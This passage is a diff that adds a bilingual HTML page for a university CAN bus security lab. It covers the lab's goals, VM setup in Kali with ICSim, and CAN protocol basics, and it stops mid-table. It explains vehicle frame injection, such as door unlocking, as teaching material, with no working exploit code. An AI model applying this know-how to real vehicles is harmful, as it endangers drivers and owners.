@@ -1,0 +1,2648 @@
+<!DOCTYPE html>
+<html lang="en" data-lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>CAN Bus Security Lab - IMT Atlantique</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link
+    href="https://fonts.googleapis.com/css2?family=IBM+Plex+Mono:wght@300;400;600&family=IBM+Plex+Sans:wght@300;400;500;600&family=Bebas+Neue&display=swap"
+    rel="stylesheet">
+  <link rel="stylesheet" href="styles.css">
+  <style>
+    /* ── UDS SERVICE GRID ───────────────────────────────────────────── */
+    .uds-service-grid {
+      display: grid;
+      grid-template-columns: repeat(auto-fit, minmax(320px, 1fr));
+      gap: 1px;
+      background: var(--border);
+      border: 1px solid var(--border);
+      margin: 1.5rem 0;
+    }
+
+    .uds-service-card {
+      background: var(--surface);
+      padding: 1.25rem 1.5rem;
+      transition: background 0.2s;
+    }
+
+    .uds-service-card:hover {
+      background: var(--surface2);
+    }
+
+    .uds-sid-badge {
+      font-family: var(--mono);
+      font-size: 0.8rem;
+      font-weight: 600;
+      color: var(--amber);
+      background: rgba(232, 160, 32, 0.08);
+      border: 1px solid rgba(232, 160, 32, 0.25);
+      border-radius: 3px;
+      padding: 0.1rem 0.5rem;
+      display: inline-block;
+      margin-bottom: 0.5rem;
+    }
+
+    .uds-service-name {
+      font-size: 0.88rem;
+      font-weight: 600;
+      color: var(--text);
+      margin-bottom: 0.35rem;
+    }
+
+    .uds-service-desc {
+      font-size: 0.82rem;
+      color: var(--text-dim);
+      margin-bottom: 0.6rem;
+    }
+
+    .uds-service-example {
+      font-family: var(--mono);
+      font-size: 0.72rem;
+      color: var(--cyan);
+      background: var(--code-bg);
+      padding: 0.4rem 0.6rem;
+      border-radius: 3px;
+      margin-bottom: 0.6rem;
+    }
+
+    .uds-doc-link {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.07em;
+      color: var(--text-faint);
+      text-transform: uppercase;
+      border: 1px solid var(--border2);
+      border-radius: 3px;
+      padding: 0.2rem 0.5rem;
+      display: inline-block;
+      transition: color 0.2s, border-color 0.2s;
+    }
+
+    .uds-doc-link:hover {
+      color: var(--cyan);
+      border-color: var(--cyan);
+      text-decoration: none;
+    }
+
+    /* ── NRC TABLE ──────────────────────────────────────────────────── */
+    .nrc-code {
+      font-family: var(--mono);
+      font-weight: 600;
+      color: var(--red);
+    }
+
+    /* ── ISO-TP FRAME VISUAL ────────────────────────────────────────── */
+    .istp-row {
+      display: flex;
+      gap: 2px;
+      margin: 0.5rem 0;
+      font-family: var(--mono);
+    }
+
+    .istp-cell {
+      padding: 0.35rem 0.5rem;
+      background: var(--surface);
+      border: 1px solid var(--border);
+      font-size: 0.72rem;
+      text-align: center;
+      min-width: 50px;
+    }
+
+    .istp-cell.istp-pci {
+      border-color: var(--amber);
+      color: var(--amber);
+      background: rgba(232, 160, 32, 0.07);
+    }
+
+    .istp-cell.istp-len {
+      border-color: var(--green);
+      color: var(--green);
+      background: rgba(56, 168, 120, 0.06);
+    }
+
+    .istp-cell.istp-sid {
+      border-color: var(--cyan);
+      color: var(--cyan);
+      background: rgba(40, 184, 200, 0.06);
+    }
+
+    .istp-cell.istp-data {
+      color: var(--text-dim);
+    }
+
+    .istp-label {
+      font-family: var(--mono);
+      font-size: 0.62rem;
+      color: var(--amber);
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      margin-right: 0.75rem;
+      min-width: 100px;
+      display: flex;
+      align-items: center;
+    }
+
+    /* ── CHALLENGE SECTIONS (replaces todo cards) ───────────────────── */
+    .challenge-list {
+      display: flex;
+      flex-direction: column;
+      gap: 0;
+    }
+
+    .challenge-section {
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      margin-bottom: 2.5rem;
+      overflow: hidden;
+      position: relative;
+    }
+
+    .challenge-section::before {
+      content: '';
+      position: absolute;
+      top: 0; left: 0;
+      width: 4px; height: 100%;
+    }
+    .challenge-section.easy::before  { background: var(--green); }
+    .challenge-section.medium::before { background: var(--amber); }
+    .challenge-section.hard::before  { background: var(--red); }
+
+    .challenge-header {
+      background: var(--surface2);
+      border-bottom: 1px solid var(--border);
+      padding: 1.5rem 2rem 1.5rem 2.5rem;
+      display: flex;
+      align-items: center;
+      gap: 1.5rem;
+    }
+
+    .challenge-num {
+      font-family: var(--display);
+      font-size: 3.5rem;
+      color: var(--border2);
+      line-height: 1;
+      min-width: 4rem;
+    }
+
+    .challenge-meta {
+      flex: 1;
+    }
+
+    .challenge-category {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      letter-spacing: 0.14em;
+      text-transform: uppercase;
+      margin-bottom: 0.3rem;
+    }
+    .challenge-section.easy  .challenge-category { color: var(--green); }
+    .challenge-section.medium .challenge-category { color: var(--amber); }
+    .challenge-section.hard  .challenge-category { color: var(--red); }
+
+    .challenge-title {
+      font-size: 1.2rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .challenge-body {
+      padding: 2rem 2rem 2rem 2.5rem;
+    }
+
+    .challenge-body p {
+      font-size: 0.9rem;
+      color: var(--text-dim);
+      line-height: 1.7;
+      margin-bottom: 1rem;
+    }
+
+    .challenge-hint {
+      background: var(--surface2);
+      border: 1px solid var(--border);
+      border-left: 3px solid var(--cyan);
+      border-radius: 3px;
+      padding: 0.75rem 1rem;
+      font-family: var(--mono);
+      font-size: 0.78rem;
+      color: var(--text-dim);
+      margin: 1.25rem 0;
+    }
+
+    .challenge-hint strong {
+      color: var(--cyan);
+      display: block;
+      margin-bottom: 0.3rem;
+      font-size: 0.65rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+    }
+
+    .challenge-footer {
+      display: flex;
+      align-items: center;
+      justify-content: flex-end;
+      padding: 1rem 2rem 1.5rem 2.5rem;
+      border-top: 1px solid var(--border);
+      background: var(--surface);
+    }
+
+    /* frame anatomy labels */
+    .frame-anatomy {
+      margin: 1.25rem 0;
+    }
+
+    .frame-anatomy-label {
+      font-family: var(--mono);
+      font-size: 0.65rem;
+      color: var(--text-faint);
+      text-transform: uppercase;
+      letter-spacing: 0.1em;
+      margin-bottom: 0.5rem;
+    }
+
+    .istp-cell.istp-unknown {
+      border-color: var(--red);
+      color: var(--red);
+      background: rgba(224, 80, 80, 0.07);
+    }
+
+    .istp-cell.istp-act {
+      border-color: var(--green);
+      color: var(--green);
+      background: rgba(56, 168, 120, 0.07);
+    }
+
+    .istp-legend {
+      display: flex;
+      flex-wrap: wrap;
+      gap: 0.75rem;
+      margin-top: 0.75rem;
+    }
+
+    .istp-legend-item {
+      display: flex;
+      align-items: center;
+      gap: 0.4rem;
+      font-family: var(--mono);
+      font-size: 0.7rem;
+      color: var(--text-dim);
+    }
+
+    .istp-legend-dot {
+      width: 8px; height: 8px;
+      border-radius: 1px;
+      flex-shrink: 0;
+    }
+
+    /* ── SOLUTION BLOCKS ─────────────────────────────────────────────── */
+    .solution-block {
+      background: var(--surface);
+      border: 1px solid var(--border);
+      border-radius: var(--radius);
+      margin: 1.5rem 0;
+      overflow: hidden;
+    }
+
+    .sol-header {
+      background: var(--surface2);
+      border-bottom: 1px solid var(--border);
+      padding: 1rem 1.5rem;
+      display: flex;
+      align-items: center;
+      gap: 1rem;
+    }
+
+    .sol-num {
+      font-family: var(--display);
+      font-size: 1.6rem;
+      color: var(--border2);
+      line-height: 1;
+      min-width: 2rem;
+    }
+
+    .sol-title {
+      font-size: 0.9rem;
+      font-weight: 600;
+      color: var(--text);
+    }
+
+    .sol-diff {
+      margin-left: auto;
+      font-family: var(--mono);
+      font-size: 0.62rem;
+      letter-spacing: 0.1em;
+      text-transform: uppercase;
+      padding: 0.2rem 0.6rem;
+      border-radius: 2px;
+    }
+
+    .sol-diff.easy {
+      color: var(--green);
+      border: 1px solid rgba(56, 168, 120, 0.3);
+    }
+
+    .sol-diff.medium {
+      color: var(--amber);
+      border: 1px solid rgba(232, 160, 32, 0.3);
+    }
+
+    .sol-diff.hard {
+      color: var(--red);
+      border: 1px solid rgba(224, 80, 80, 0.3);
+    }
+
+    .sol-body {
+      padding: 1.25rem 1.5rem;
+    }
+
+    .sol-body p {
+      font-size: 0.9rem;
+      color: var(--text-dim);
+      margin-bottom: 0.75rem;
+    }
+  </style>
+</head>
+
+<body>
+
+  <!-- ═══════════════════════════════════════════════════════ NAVIGATION -->
+  <nav>
+    <div class="nav-brand">IMT Atlantique <span>/ CAN Security Lab</span></div>
+    <ul class="nav-links">
+      <li><a href="#" onclick="return showPage('intro')" class="active" id="nav-intro">
+          <span class="en">Introduction</span><span class="fr">Introduction</span></a></li>
+      <li><a href="#" onclick="return showPage('setup')" id="nav-setup">
+          <span class="en">Installation</span><span class="fr">Installation</span></a></li>
+      <li><a href="#" onclick="return showPage('can')" id="nav-can">
+          <span class="en">Bus CAN</span><span class="fr">Bus CAN</span></a></li>
+      <li><a href="#" onclick="return showPage('encoding')" id="nav-encoding">
+          <span class="en">Encoding</span><span class="fr">Encodage</span></a></li>
+      <li><a href="#" onclick="return showPage('uds')" id="nav-uds">
+          <span class="en">UDS</span><span class="fr">UDS</span></a></li>
+      <li><a href="#" onclick="return showPage('reference')" id="nav-reference">
+          <span class="en">Reference</span><span class="fr">Référence</span></a></li>
+      <li><a href="#" onclick="return showPage('todo')" id="nav-todo">
+          <span class="en">TO-DO</span><span class="fr">TO-DO</span></a></li>
+    </ul>
+    <div class="nav-controls">
+      <button class="theme-btn" id="theme-toggle" onclick="toggleTheme()">&#9728; Light</button>
+      <div class="lang-toggle">
+        <button class="lang-btn active" onclick="setLang('en')">EN</button>
+        <button class="lang-btn" onclick="setLang('fr')">FR</button>
+      </div>
+    </div>
+  </nav>
+
+  <!-- ═══════════════════════════════════════════ PAGE: INTRODUCTION -->
+  <div class="page active" id="page-intro">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag">
+          <span class="en">Part 1 - Internet of Vehicles Security</span>
+          <span class="fr">Partie 1 - Sécurité de l'Internet des Véhicules</span>
+        </div>
+        <h1>
+          <span class="en">CAN BUS <span class="accent">ATTACK</span><br>SURFACE</span>
+          <span class="fr">SURFACE D'ATTAQUE<br>BUS <span class="accent">CAN</span></span>
+        </h1>
+        <p class="hero-sub">
+          <span class="en">A practical security lab built on virtual CAN bus simulation. Observe, reverse-engineer, and
+            inject frames exactly as a real automotive attacker would - without touching a physical vehicle.</span>
+          <span class="fr">Un laboratoire de sécurité pratique basé sur la simulation de bus CAN virtuel. Observez,
+            rétro-concevez et injectez des trames comme le ferait un véritable attaquant automobile - sans toucher un
+            véhicule physique.</span>
+        </p>
+        <div class="hero-meta">
+          <div class="hero-meta-item">
+            <strong>IMT Atlantique - Brest</strong>
+            <span class="en">Supervised by Samiha Ayed</span>
+            <span class="fr">Encadré par Samiha Ayed</span>
+          </div>
+          <div class="hero-meta-item">
+            <strong><span class="en">Environment</span><span class="fr">Environnement</span></strong>
+            <span>Kali Linux / ICSim / CH-Workshop</span>
+          </div>
+          <div class="hero-meta-item">
+            <strong><span class="en">Protocol</span><span class="fr">Protocole</span></strong>
+            <span>SocketCAN / ISO 11898 / UDS</span>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="content">
+      <div class="section-label"><span class="en">Context</span><span class="fr">Contexte</span></div>
+      <h2><span class="en">Why Vehicle Security Matters</span><span class="fr">Pourquoi la Sécurité Automobile</span>
+      </h2>
+      <p class="lead">
+        <span class="en">In 2015, security researchers Charlie Miller and Chris Valasek demonstrated a remote compromise
+          of a Jeep Cherokee via its cellular interface, gaining control over the CAN bus and ultimately the vehicle's
+          brakes and steering at highway speed. The attack was possible because the CAN protocol - designed in the 1980s
+          for isolated networks - has no authentication, no encryption, and no concept of a trusted sender.</span>
+        <span class="fr">En 2015, les chercheurs en sécurité Charlie Miller et Chris Valasek ont démontré une
+          compromission à distance d'une Jeep Cherokee via son interface cellulaire, prenant le contrôle du bus CAN et
+          finalement des freins et de la direction du véhicule à grande vitesse. L'attaque était possible parce que le
+          protocole CAN - conçu dans les années 1980 pour des réseaux isolés - n'a ni authentification, ni chiffrement,
+          ni notion d'émetteur de confiance.</span>
+      </p>
+      <div class="info-block red">
+        <div class="info-block-label"><span class="en">Real-world consequence</span><span class="fr">Conséquence
+            réelle</span></div>
+        <p><span class="en">Any process that can write to the CAN bus has the same authority as a legitimate ECU. There
+            is no way for a receiving module to distinguish an injected frame from a real one.</span>
+          <span class="fr">Tout processus capable d'écrire sur le bus CAN a la même autorité qu'un véritable calculateur
+            (ECU). Il est impossible pour un module récepteur de distinguer une trame injectée d'une trame
+            réelle.</span>
+        </p>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Lab Structure</span><span class="fr">Structure du Lab</span></div>
+      <h2><span class="en">What You Will Do</span><span class="fr">Ce que Vous Allez Faire</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="card-num">01</div>
+          <div class="card-title"><span class="en">Scan</span><span class="fr">Scanner</span></div>
+          <p><span class="en">Capture live CAN traffic with candump. Identify which IDs carry meaningful signals by
+              observing changes as you interact with the vehicle simulator.</span>
+            <span class="fr">Capturer du trafic CAN en direct avec candump. Identifier quels IDs portent des signaux
+              significatifs en observant les changements.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-num">02</div>
+          <div class="card-title"><span class="en">Encode</span><span class="fr">Encoder</span></div>
+          <p><span class="en">Understand how signals are packed into raw bytes - big-endian integers, bitmasks, and
+              scaling factors. Build frames you can inject.</span>
+            <span class="fr">Comprendre comment les signaux sont codés en octets bruts - entiers big-endian, masques de
+              bits et facteurs d'échelle. Construire des trames injectables.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-num">03</div>
+          <div class="card-title"><span class="en">Decode</span><span class="fr">Décoder</span></div>
+          <p><span class="en">Read raw candump output and extract the actual signal value - reverse the encoding to
+              understand what each frame is saying and then inject crafted frames.</span>
+            <span class="fr">Lire la sortie brute de candump et extraire la vraie valeur du signal - inverser l'encodage
+              pour comprendre ce que dit chaque trame, puis injecter des trames.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-num">04</div>
+          <div class="card-title"><span class="en">Diagnose (UDS)</span><span class="fr">Diagnostiquer (UDS)</span>
+          </div>
+          <p><span class="en">Interact with the UDS diagnostic stack: open sessions, extract the VIN, perform Security
+              Access authentication, and find hidden commands.</span>
+            <span class="fr">Interagir avec la pile de diagnostic UDS : ouvrir des sessions, extraire le VIN, effectuer
+              l'authentification Security Access et trouver des commandes cachées.</span>
+          </p>
+        </div>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Simulation vs Reality</span><span class="fr">Simulation vs
+          Réalité</span></div>
+      <h2><span class="en">How the Lab Maps to Real Vehicles</span><span class="fr">Comment le Lab Correspond aux
+          Véhicules Réels</span></h2>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th><span class="en">Lab element</span><span class="fr">Élément lab</span></th>
+              <th><span class="en">Real-vehicle equivalent</span><span class="fr">Équivalent véhicule réel</span></th>
+              <th><span class="en">Attack impact</span><span class="fr">Impact attaque</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td><code>vcan0</code></td>
+              <td><span class="en">Physical CAN bus (H/L wires)</span><span class="fr">Bus CAN physique (fils
+                  H/L)</span></td>
+              <td class="dim"><span class="en">Access via OBD-II port</span><span class="fr">Accès via port
+                  OBD-II</span></td>
+            </tr>
+            <tr>
+              <td><code>controls</code></td>
+              <td><span class="en">Engine / body ECUs transmitting state</span><span class="fr">Calculateurs moteur /
+                  carrosserie</span></td>
+              <td class="dim"><span class="en">Legitimate sender on bus</span><span class="fr">Émetteur légitime sur
+                  bus</span></td>
+            </tr>
+            <tr>
+              <td><code>icsim</code></td>
+              <td><span class="en">Instrument cluster (display ECU)</span><span class="fr">Tableau de bord (ECU
+                  affichage)</span></td>
+              <td class="dim"><span class="en">Read-only display - visual spoofing only</span><span class="fr">Affichage
+                  lecture seule - usurpation visuelle uniquement</span></td>
+            </tr>
+            <tr>
+              <td><code>0x244</code> speed frame</td>
+              <td><span class="en">Wheel speed sensor broadcast</span><span class="fr">Diffusion capteur vitesse
+                  roue</span></td>
+              <td class="dim"><span class="en">Speedometer spoof (display only)</span><span class="fr">Usurpation
+                  compteur (affichage uniquement)</span></td>
+            </tr>
+            <tr>
+              <td><code>0x19B</code> door frame</td>
+              <td><span class="en">Body Control Module (BCM) door state</span><span class="fr">Module carrosserie (BCM)
+                  état portes</span></td>
+              <td class="dim"><span class="en">Remote door unlock (actuator)</span><span class="fr">Déverrouillage porte
+                  à distance (actionneur)</span></td>
+            </tr>
+            <tr>
+              <td>UDS on <code>0x7E0</code></td>
+              <td><span class="en">OBD-II diagnostic interface</span><span class="fr">Interface diagnostic OBD-II</span>
+              </td>
+              <td class="dim"><span class="en">ECU reprogramming, fault clearing</span><span class="fr">Reprogrammation
+                  ECU, effacement défauts</span></td>
+            </tr>
+          </tbody>
+        </table>
+      </div>
+      <div class="info-block amber">
+        <div class="info-block-label"><span class="en">Key distinction</span><span class="fr">Distinction clé</span>
+        </div>
+        <p><span class="en">The speedometer is a <strong>read-only display</strong> - injecting a fake speed frame only
+            fools the gauge. Door locks are <strong>actuators</strong> - injecting the correct frame causes the physical
+            lock to move on a real vehicle. The distinction between sensor signals and command signals is fundamental to
+            understanding attack severity.</span>
+          <span class="fr">Le compteur de vitesse est un <strong>affichage lecture seule</strong> - injecter une fausse
+            trame de vitesse ne trompe que le compteur. Les verrous de portes sont des <strong>actionneurs</strong> -
+            injecter la bonne trame actionne le verrou physique sur un vrai véhicule.</span>
+        </p>
+      </div>
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════ PAGE: SETUP -->
+  <div class="page" id="page-setup">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">Getting Started</span><span class="fr">Démarrage</span></div>
+        <h1><span class="en">LAB <span class="accent">SETUP</span></span><span class="fr">INSTALLATION <span
+              class="accent">LAB</span></span></h1>
+        <p class="hero-sub">
+          <span class="en">Two paths to a working environment. Choose the pre-built virtual machine for immediate
+            access, or perform a manual installation on a Debian-based system.</span>
+          <span class="fr">Deux chemins vers un environnement fonctionnel. Choisissez la machine virtuelle préconfigurée
+            pour un accès immédiat, ou effectuez une installation manuelle sur un système Debian-based.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content">
+      <div class="section-label"><span class="en">Prerequisites</span><span class="fr">Prérequis</span></div>
+      <h2><span class="en">What You Need</span><span class="fr">Ce Dont Vous Avez Besoin</span></h2>
+      <div class="cards">
+        <div class="card">
+          <div class="card-title"><span class="en">Hardware</span><span class="fr">Matériel</span></div>
+          <p><span class="en">Any x86-64 machine capable of running a virtual machine. 4 GB RAM minimum, 8 GB
+              recommended. 20 GB free disk space.</span>
+            <span class="fr">N'importe quelle machine x86-64 capable de faire tourner une machine virtuelle. 4 Go RAM
+              minimum, 8 Go recommandé. 20 Go d'espace disque libre.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-title"><span class="en">Hypervisor</span><span class="fr">Hyperviseur</span></div>
+          <p><span class="en">VMware Workstation, VMware Player (free), KVM/QEMU, or VirtualBox. The provided image is
+              in vmdk format.</span>
+            <span class="fr">VMware Workstation, VMware Player (gratuit), KVM/QEMU, ou VirtualBox. L'image fournie est
+              au format vmdk.</span>
+          </p>
+        </div>
+        <div class="card">
+          <div class="card-title"><span class="en">Display</span><span class="fr">Affichage</span></div>
+          <p><span class="en">A graphical session is required inside the VM - ICSim renders two SDL windows. SSH without
+              X11 forwarding is not sufficient.</span>
+            <span class="fr">Une session graphique est requise dans la VM - ICSim affiche deux fenêtres SDL. SSH sans
+              redirection X11 est insuffisant.</span>
+          </p>
+        </div>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Installation</span><span class="fr">Installation</span></div>
+      <h2><span class="en">Choose Your Method</span><span class="fr">Choisissez Votre Méthode</span></h2>
+      <div class="option-tabs">
+        <div class="option-tab active" onclick="switchTab('vm')">
+          <span class="en">Option A - Pre-built VM</span><span class="fr">Option A - VM préconfigurée</span>
+        </div>
+        <div class="option-tab" onclick="switchTab('manual')">
+          <span class="en">Option B - Manual Install</span><span class="fr">Option B - Installation manuelle</span>
+        </div>
+      </div>
+
+      <div class="option-panel active" id="tab-vm">
+        <h3><span class="en">Pre-built Kali Linux Image</span><span class="fr">Image Kali Linux préconfigurée</span>
+        </h3>
+        <p><span class="en">A ready-to-use vmdk virtual machine image is provided by your instructor. CH-Workshop (the
+            Barbhack ICSim fork) is already compiled and configured. All lab scripts are pre-installed.</span>
+          <span class="fr">Une image de machine virtuelle vmdk prête à l'emploi est fournie par votre encadrant.
+            CH-Workshop (le fork Barbhack d'ICSim) est déjà compilé et configuré. Tous les scripts du lab sont
+            préinstallés.</span>
+        </p>
+        <ul class="steps" style="margin-top:1.5rem">
+          <li class="step">
+            <div class="step-num">1</div>
+            <div>
+              <div class="step-title"><span class="en">Import the image</span><span class="fr">Importer l'image</span>
+              </div>
+              <p><span class="en">Open your hypervisor and import the QCOW2 file. In VMware, create a new VM and select
+                  the existing disk image. Allocate at least 2 vCPUs and 2 GB RAM.</span>
+                <span class="fr">Ouvrez votre hyperviseur et importez le fichier QCOW2. Dans VMware, créez une nouvelle
+                  VM et sélectionnez l'image disque existante. Allouez au moins 2 vCPU et 2 Go de RAM.</span>
+              </p>
+            </div>
+          </li>
+          <li class="step">
+            <div class="step-num">2</div>
+            <div>
+              <div class="step-title"><span class="en">Boot and log in</span><span class="fr">Démarrer et se
+                  connecter</span></div>
+              <p><span class="en">Credentials: <code>kali : kali</code>. A graphical desktop will start
+                  automatically.</span>
+                <span class="fr">Identifiants : <code>kali : kali</code>. Un bureau graphique démarrera
+                  automatiquement.</span>
+              </p>
+            </div>
+          </li>
+          <li class="step">
+            <div class="step-num">3</div>
+            <div>
+              <div class="step-title"><span class="en">Verify the environment</span><span class="fr">Vérifier
+                  l'environnement</span></div>
+              <p><span class="en">Open a terminal and run <code>ip link show vcan0</code>. The interface should be UP.
+                  Then run <code>icsim-start</code> to launch the simulator.</span>
+                <span class="fr">Ouvrez un terminal et exécutez <code>ip link show vcan0</code>. L'interface doit être
+                  UP.
+                  Ensuite, lancez <code>icsim-start</code> pour démarrer le simulateur.</span>
+              </p>
+            </div>
+          </li>
+        </ul>
+      </div>
+
+      <div class="option-panel" id="tab-manual">
+        <h3><span class="en">Manual Installation on Kali Linux</span><span class="fr">Installation manuelle sur Kali
+            Linux</span></h3>
+        <p><span class="en">Run the provided <code>setup.sh</code> script as root on a fresh Linux installation. The
+            script handles all dependencies, kernel module loading, vcan0 persistence, and compilation.</span>
+          <span class="fr">Exécutez le script <code>setup.sh</code> fourni en tant que root sur une installation Linux
+            fraîche. Le script gère toutes les dépendances, le chargement des modules noyau, la persistance de vcan0 et
+            la compilation.</span>
+        </p>
+        <div class="code-label"><span class="en">Download and run the setup script</span><span class="fr">Télécharger et
+            lancer le script d'installation</span></div>
+        <pre><code><span class="hl-dim"># Download setup.sh from your instructor or course portal</span>
+<span class="hl-amber">sudo</span> bash setup.sh</code></pre>
+        <ul class="steps" style="margin-top:1rem">
+          <li class="step">
+            <div class="step-num">1</div>
+            <div>
+              <div class="step-title"><span class="en">Install dependencies</span><span class="fr">Installer les
+                  dépendances</span></div>
+              <p><code>git build-essential can-utils libsdl2-dev libsdl2-image-dev</code></p>
+            </div>
+          </li>
+          <li class="step">
+            <div class="step-num">2</div>
+            <div>
+              <div class="step-title"><span class="en">Load CAN kernel modules</span><span class="fr">Charger les
+                  modules noyau CAN</span></div>
+              <p><code>modprobe can &amp;&amp; modprobe vcan</code> - <span class="en">persisted in
+                  /etc/modules</span><span class="fr">persisté dans /etc/modules</span></p>
+            </div>
+          </li>
+          <li class="step">
+            <div class="step-num">3</div>
+            <div>
+              <div class="step-title"><span class="en">Create vcan0 with systemd persistence</span><span
+                  class="fr">Créer vcan0 avec persistance systemd</span></div>
+              <p><span class="en">A systemd service ensures vcan0 is recreated automatically on every reboot.</span>
+                <span class="fr">Un service systemd garantit que vcan0 est recréé automatiquement à chaque
+                  redémarrage.</span>
+              </p>
+            </div>
+          </li>
+          <li class="step">
+            <div class="step-num">4</div>
+            <div>
+              <div class="step-title"><span class="en">Clone and compile CH-Workshop</span><span class="fr">Cloner et
+                  compiler CH-Workshop</span></div>
+              <p><span class="en">Clones <code>phil-eqtech/CH-Workshop</code> to <code>/opt/CH-Workshop</code> and
+                  compiles the CAN module.</span>
+                <span class="fr">Clone <code>phil-eqtech/CH-Workshop</code> vers <code>/opt/CH-Workshop</code> et
+                  compile le module CAN.</span>
+              </p>
+            </div>
+          </li>
+          <li class="step">
+            <div class="step-num">5</div>
+            <div>
+              <div class="step-title"><span class="en">Install launcher scripts</span><span class="fr">Installer les
+                  scripts de lancement</span></div>
+              <p><code>icsim-start</code>, <code>icsim-stop</code>, <code>icsim-replay</code> - <span
+                  class="en">available system-wide</span><span class="fr">disponibles globalement</span></p>
+            </div>
+          </li>
+        </ul>
+      </div>
+
+      <hr class="divider">
+      <div class="section-label"><span class="en">Verification</span><span class="fr">Vérification</span></div>
+      <h2><span class="en">Confirm the Lab Works</span><span class="fr">Confirmer que le Lab Fonctionne</span></h2>
+      <div class="code-label"><span class="en">Terminal 1 - Instrument cluster</span><span class="fr">Terminal 1 -
+          Tableau de bord</span></div>
+      <pre><code>icsim-start</code></pre>
+      <div class="code-label"><span class="en">Terminal 2 - CAN traffic monitor</span><span class="fr">Terminal 2 -
+          Moniteur de trafic CAN</span></div>
+      <pre><code>candump vcan0</code></pre>
+      <p><span class="en">Two SDL windows should open: the instrument cluster and the controls panel. Press the up arrow
+          key in the controls window - the speedometer needle should rise and frames should appear in candump.</span>
+        <span class="fr">Deux fenêtres SDL doivent s'ouvrir : le tableau de bord et le panneau de contrôle. Appuyez sur
+          la touche flèche haut dans la fenêtre de contrôle - l'aiguille du compteur doit monter et des trames doivent
+          apparaître dans candump.</span>
+      </p>
+      <div class="info-block amber">
+        <div class="info-block-label"><span class="en">Important</span><span class="fr">Important</span></div>
+        <p><span class="en">Click the <strong>controls window</strong> to give it keyboard focus before pressing any
+            keys. If one window closes unexpectedly, restart both with <code>icsim-stop</code> followed by
+            <code>icsim-start</code>.</span>
+          <span class="fr">Cliquez sur la <strong>fenêtre de contrôle</strong> pour lui donner le focus clavier avant
+            d'appuyer sur des touches. Si une fenêtre se ferme de manière inattendue, redémarrez les deux avec
+            <code>icsim-stop</code> puis <code>icsim-start</code>.</span>
+        </p>
+      </div>
+    </div>
+    <footer>
+      <span class="en">IMT Atlantique Brest - IoV Security Lab - CAN Bus</span>
+      <span class="fr">IMT Atlantique Brest - Lab Sécurité IoV - Bus CAN</span>
+    </footer>
+  </div>
+
+  <!-- ═══════════════════════════════════════════════ PAGE: BUS CAN -->
+  <div class="page" id="page-can">
+    <div class="hero">
+      <div class="hero-inner">
+        <div class="hero-tag"><span class="en">Bus Scanning &amp; Protocol</span><span class="fr">Scan de Bus &amp;
+            Protocole</span></div>
+        <h1><span class="en">THE <span class="accent">CAN</span> BUS</span><span class="fr">LE BUS <span
+              class="accent">CAN</span></span></h1>
+        <p class="hero-sub">
+          <span class="en">How the Controller Area Network protocol works in real vehicles, how ICSim simulates it, and
+            how to scan and capture live traffic with SocketCAN tools.</span>
+          <span class="fr">Comment le protocole Controller Area Network fonctionne dans les véhicules réels, comment
+            ICSim le simule, et comment scanner et capturer le trafic en direct avec les outils SocketCAN.</span>
+        </p>
+      </div>
+    </div>
+    <div class="content">
+
+      <div class="section-label"><span class="en">Real Vehicles</span><span class="fr">Véhicules Réels</span></div>
+      <h2><span class="en">CAN in Production Vehicles</span><span class="fr">Le CAN dans les Véhicules de
+          Production</span></h2>
+      <p class="lead">
+        <span class="en">CAN (Controller Area Network, ISO 11898) was designed by Bosch in 1983 as a cost-effective way
+          to replace hundreds of point-to-point wires with a single two-wire bus. Today every road vehicle sold in
+          Europe and North America contains at least one CAN bus, often several running at different speeds for
+          different systems.</span>
+        <span class="fr">Le CAN (Controller Area Network, ISO 11898) a été conçu par Bosch en 1983 comme moyen
+          économique de remplacer des centaines de fils point à point par un unique bus à deux fils. Aujourd'hui, tout
+          véhicule vendu en Europe et en Amérique du Nord contient au moins un bus CAN, souvent plusieurs fonctionnant à
+          des vitesses différentes pour différents systèmes.</span>
+      </p>
+      <div class="table-wrap">
+        <table>
+          <thead>
+            <tr>
+              <th><span class="en">Bus</span><span class="fr">Bus</span></th>
+              <th><span class="en">Speed</span><span class="fr">Débit</span></th>
+              <th><span class="en">Typical use</span><span class="fr">Usage typique</span></th>
+            </tr>
+          </thead>
+          <tbody>
+            <tr>
+              <td>CAN</td>
+              <td>1 Mbit/s</td>
+              <td><span class="en">Powertrain, brakes (safety-critical)</span><span class="fr">Groupe motopropulseur,
+                  freins (sécurité critique)</span></td>
+            </tr>
+            <tr>
+              <td>CAN-FD</td>
+              <td>8 Mbit/s</td>
+              <td><span class="en">ADAS, extended payload (64 bytes)</span><span class="fr">ADAS, payload étendu (64
+                  octets)</span></td>
+            </tr>
+            <tr>
+              <td>LIN</td>
+              <td>20 kbit/s</td>
+              <td><span class="en">Comfort systems (windows, seats)</span><span class="fr">Systèmes de confort (vitres,
+                  sièges)</span></td>
+            </tr>
+            <tr>
+              <td>Automotive Ethernet</td>
+              <td>100 Mbit/s+</td>
